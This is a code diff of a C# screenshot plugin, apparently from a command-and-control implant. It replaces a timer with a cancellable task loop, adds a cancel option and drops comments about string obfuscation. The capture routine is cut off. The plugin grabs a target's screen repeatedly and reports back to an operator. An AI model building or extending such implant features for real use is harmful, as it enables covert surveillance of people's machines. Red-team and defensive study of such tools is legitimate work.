@@ -8,34 +8,41 @@ using System.Drawing;
 using System.IO;
 using System.IO.Compression;
 using System.Runtime.InteropServices;
-using System.Timers;
+using System.Threading;
+using System.Threading.Tasks;
 
 namespace Plugins
 {
     public class Screenshot : AthenaPlugin
     {
-        private static System.Timers.Timer screenshotTimer;
-
-        public override string Name => "screenshot";
-        public CancellationTokenSource cts = new CancellationTokenSource();
+        private CancellationTokenSource cts = new CancellationTokenSource();
         private bool isRunning = false;
-        public string task_id = String.Empty;
+        public override string Name => "screenshot";
 
         public override void Execute(Dictionary<string, string> args)
         {
-            int intervalInSeconds = 0; // Default interval should be 0 to just take one
+            int intervalInSeconds = 0; // Default interval should be 0 to take just one
 
-            if (isRunning) // this should something     if (isRunning)
-
+            if (args.ContainsKey("cancel"))
             {
+                if (isRunning)
+                {
+                    // Cancel the running task and reset the flag.
+                    cts.Cancel();
+                    isRunning = false;
+                    TaskResponseHandler.Write("Screenshot task has been canceled.", args["task-id"], true, "info");
+                }
+                else
+                {
+                    TaskResponseHandler.Write("No screenshot task is currently running.", args["task-id"], true, "info");
+                }
+                return;
+            }
 
-                // If a previous timer exists, stop it and dispose of it.
-                screenshotTimer.Stop();
-                screenshotTimer.Dispose();
-                TaskResponseHandler.Write("Long running task detected, canceling old task ", args["task-id"], true, "error");
-                //process_response = new Dictionary<string, string> { { "message", "0x46" + intervalInSeconds  } }, //string Obfuscation
-                this.isRunning = false;
-                cts.Cancel();
+            if (isRunning)
+            {
+                TaskResponseHandler.Write("A screenshot task is already running. Wait for it to complete or cancel it.", args["task-id"], true, "info");
+                return;
             }
 
             if (args.ContainsKey("interval") && int.TryParse(args["interval"], out intervalInSeconds))
@@ -43,7 +50,6 @@ namespace Plugins
                 if (intervalInSeconds < 0)
                 {
                     TaskResponseHandler.Write("Invalid interval value. It must be a non-negative integer.", args["task-id"], true, "error");
-                    //process_response = new Dictionary<string, string> { { "message", "0x47" + intervalInSeconds  } }, //string Obfuscation
                     return;
                 }
 
@@ -53,28 +59,38 @@ namespace Plugins
                     return;
                 }
 
-                screenshotTimer = new System.Timers.Timer(intervalInSeconds * 1000); // Convert seconds to milliseconds
-                screenshotTimer.Elapsed += (sender, e) => CaptureAndSendScreenshot(args);
-
-                // Set AutoReset to false for a one-time execution if the interval is greater than 0
-                screenshotTimer.AutoReset = intervalInSeconds > 0;
-                screenshotTimer.Enabled = true;
-                TaskResponseHandler.AddResponse(new ResponseResult
+                // Start the task with cancellation support.
+                Task.Run(async () =>
                 {
-                    completed = true,
-                    user_output = $"Capturing screenshots delay between is {intervalInSeconds}.",
-                    //process_response = new Dictionary<string, string> { { "message", "0x45" + intervalInSeconds  } }, //string Obfuscation
-                    task_id = args["task-id"],
+                    isRunning = true;
+                    await CaptureScreenshotsWithInterval(args, intervalInSeconds, cts.Token);
+                    isRunning = false;
                 });
             }
             else
             {
-                cts = new CancellationTokenSource();
                 CaptureAndSendScreenshot(args);
             }
         }
 
-        private static void CaptureAndSendScreenshot(Dictionary<string, string> args)
+        private async Task CaptureScreenshotsWithInterval(Dictionary<string, string> args, int intervalInSeconds, CancellationToken token)
+        {
+            while (!token.IsCancellationRequested)
+            {
+                CaptureAndSendScreenshot(args);
+                try
+                {
+                    await Task.Delay(TimeSpan.FromSeconds(intervalInSeconds), token);
+                }
+                catch (TaskCanceledException)
+                {
+                    // Task was canceled, exit the loop.
+                    break;
+                }
+            }
+        }
+
+        private void CaptureAndSendScreenshot(Dictionary<string, string> args)
         {
             try
             {
